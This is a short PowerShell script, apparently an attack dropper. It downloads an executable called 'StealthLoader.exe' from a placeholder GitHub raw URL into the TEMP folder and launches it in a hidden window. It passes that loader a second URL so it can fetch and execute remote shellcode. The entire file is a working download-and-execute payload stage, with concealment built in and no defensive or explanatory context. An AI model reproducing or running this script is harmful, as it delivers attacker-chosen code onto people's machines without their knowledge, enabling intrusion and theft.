# --- Configuration ---
# Update these URLs with your GitHub raw links
$stealthLoaderUrl = "https://raw.githubusercontent.com/YourUserName/YourRepo/main/StealthLoader.exe"
$shellcodeUrl     = "https://raw.githubusercontent.com/YourUserName/YourRepo/main/shellcode.bin"

# Local path where the stealth loader executable will be saved
$stealthLoaderPath = "$env:TEMP\StealthLoader.exe"

# --- Download the Stealth Loader ---
Write-Output "[*] Downloading stealth loader from: $stealthLoaderUrl"
try {
    Invoke-WebRequest -Uri $stealthLoaderUrl -OutFile $stealthLoaderPath -UseBasicParsing
    Write-Output "[+] Stealth loader downloaded to: $stealthLoaderPath"
} catch {
    Write-Error "[-] Failed to download stealth loader. Exiting."
    exit 1
}

# Verify the file exists
if (!(Test-Path $stealthLoaderPath)) {
    Write-Error "[-] Stealth loader not found at: $stealthLoaderPath. Exiting."
    exit 1
}

# --- Execute the Stealth Loader with the Shellcode URL as Parameter ---
Write-Output "[*] Launching stealth loader with shellcode URL: $shellcodeUrl"
# The stealth loader is designed to download and execute the shellcode binary given as an argument.
# Start-Process with -WindowStyle Hidden keeps the process out of sight.
Start-Process -FilePath $stealthLoaderPath -ArgumentList $shellcodeUrl -WindowStyle Hidden

Write-Output "[+] Stealth loader launched. Script complete."
